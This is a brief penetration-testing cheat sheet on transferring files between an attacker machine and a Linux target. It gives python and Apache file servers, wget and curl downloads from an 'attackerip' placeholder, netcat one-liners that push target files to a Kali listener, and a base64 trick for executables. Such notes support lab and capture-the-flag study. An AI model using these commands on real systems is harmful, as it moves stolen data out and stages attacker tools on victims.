# Linux File Transfer



## Python SimpleHTTPServer

### on Attacker

```text
python -m SimpleHTTPServer
```

### python3

```text
python3 -m http.server
```

### on target

```text
wget <attackerip>:8000/filename
```

## Apache

### on Attacker

```text
cp filetosend.txt /var/www/html
service apache2 start
```

### on target

```text
wget http://attackerip/file
curl http://attackerip/file > file
fetch http://attackerip/file        # on BSD
```

## Netcat \(From Target to Kali\)

### Listen on Kali

```text
nc -lvp 4444 > file
```

### Send from Target machine

```text
nc <kali_ip> 4444 < file
```

## Netcat \(From Kali to Target\)

### on target, wait for the file

```text
nc -nvlp 55555 > file
```

### on kali, push the file

```text
nc $victimip 55555 < file
```

## Extra:

> To send the executable file to your machine:

base64 executable

* copy the output
* paste it in a file called file.txt
* decode it and create the executable

```text
base64 -d file.txt > executable
```

